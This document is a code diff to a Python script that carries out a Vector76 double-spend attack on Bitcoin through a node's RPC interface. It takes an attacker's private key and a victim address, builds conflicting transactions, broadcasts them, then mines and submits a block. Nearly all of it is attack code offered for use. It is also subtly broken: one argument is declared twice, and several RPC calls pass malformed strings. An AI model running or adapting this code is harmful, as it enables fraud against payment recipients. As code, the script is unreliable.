@@ -6,6 +6,7 @@ import subprocess
 from datetime import datetime
 from hashlib import sha256
 from bitcoinrpc.authproxy import AuthServiceProxy, JSONRPCException
+from bitcoinaddress import Wallet
 
 parser = argparse.ArgumentParser(description="How To Use vector76")
 parser.add_argument("node_host",
@@ -20,6 +21,21 @@ parser.add_argument("username",
 parser.add_argument("password",
                     help="Node password",
                     type=str)
+parser.add_argument("prev_deposit_TXID",
+                    help="Last deposit TXID of first attacker address",
+                    type=str)
+parser.add_argument("attacker_signkey",
+                    help="The attacker has the WIF format private key of the first address (this is used to sign the transaction)",
+                    type=str)
+parser.add_argument("victim_address",
+                    help="victim address.",
+                    type=str)
+parser.add_argument("attacker_address",
+                    help="Address held by attacker to receive refund (Please prepare an address that is different from the address that can be generated with the private key specified in the first place.)",
+                    type=str)
+parser.add_argument("amount_of_coins",
+                    help="Amount of coins sent. (Enter in BTC units)",
+                    type=float)
 parser.add_argument("prev_deposit_TXID",
                     help="Last deposit TXID of first attacker address",
                     type=str)
@@ -168,7 +184,10 @@ rpc_host = args.node_host
 rpc_port = args.node_port
 username = args.username
 password = args.password
+victim_address   = args.victim_address
+attacker_address = args.attacker_address
 prev_txid  = args.prev_deposit_TXID
+amount_btc = args.amount_of_coins
 network    = args.network
 
 if (network != "main") and (network != "test3"):
@@ -180,10 +199,12 @@ print("Connecting Node...")
 rpc_node = AuthServiceProxy(f"http://{username}:{password}@{rpc_host}:{rpc_port}")#(rpcuser=username, rpcpasswd=password, rpchost=rpc_host, rpcport=rpc_port)
 print(rpc_node.getblockchaininfo())
 print()
-fee_satoshi = 1500
-tx_victim   = input("Send to victim rawtx   (V1) : ")
-tx_attacker = input("Send to attacker rawtx (V2) : ")
+tx_victim = rpc_node.createrawtransaction(f"[\"txid\":\"{prev_txid}\",\"vout\":0] [\"{victim_address}\":\"{amount_btc}\"]")
+tx_attacker = rpc_node.createrawtransaction(f"[\"txid\":\"{prev_txid}\",\"vout\":0] [\"{attacker_address}\":\"{amount_btc}\"]")
 print("--------------------")
+print(f"Victim   : {victim_address}")
+print(f"Attacker : {attacker_address}")
+print(f"Send Amount : {amount_btc} BTC")
 print(f"V1 RawTx               : {tx_victim}")
 print(f"V2 RawTx               : {tx_attacker}")
 print("--------------------")
@@ -194,23 +215,25 @@ input(" --- Press the enter key to continue the Vector76 attack... --- ")
 print()
 
 print("push V1 TX...")
-broadcast_transaction(tx_victim)
-print()
+result = rpc_node.sendrawtransaction(tx_victim) 
+print(result)
 print("push V2 TX...")
-result = rpc_node.sendrawtransaction(tx_attacker) # 念の為V1とは別の送信先で
+result = rpc_node.sendrawtransaction(tx_attacker)
+print(result)
 print("Request blockheader...")
-block_header_V = get_block_header_by_txid(prev_txid)
-vector76_block = mine_vector76_block(block_header_V, tx_attacker) # 一つ目のトランザクション = 
-print(f"Mined Vector76 Block Hash : {vector76_block}")
+print(f"Mining Vector76 Block...")
+vector76_block = rpc_node.generateblock(f'{attacker_address} \'["{tx_attacker}"]\'')
 print()
-#print("Request Blockheader...")
-#block_header_V = get_block_header_by_txid(prev_txid)
-#print("Mining Vector76 Block...")
-#vector76_block = mine_vector76_block(block_header_V, tx_victim) # 一つ目のトランザクション = 被害者あてのトランザクション?
-#print(vector76_block)
+print("Request Blockheader...")
+block_header_V = get_block_header_by_txid(prev_txid)
+print("Mining Vector76 Block...")
+print()
+miner = Wallet()
+print(miner)
+vector76_block = rpc_node.generateblock(f"{miner} ['{tx_victim}', '{prev_txid}]") # 一つ目のトランザクション = 被害者あてのトランザクション?
 input("--- Send the block after pressing the enter key. --- ")
 print()
-print(f"Submitting Vector76 Block...   : {vector76_block}")
+print(f"Submit Vector76 Block...   : {vector76_block}")
 print()
 result = rpc_node.submitblock(vector76_block)
 print()#おまけ
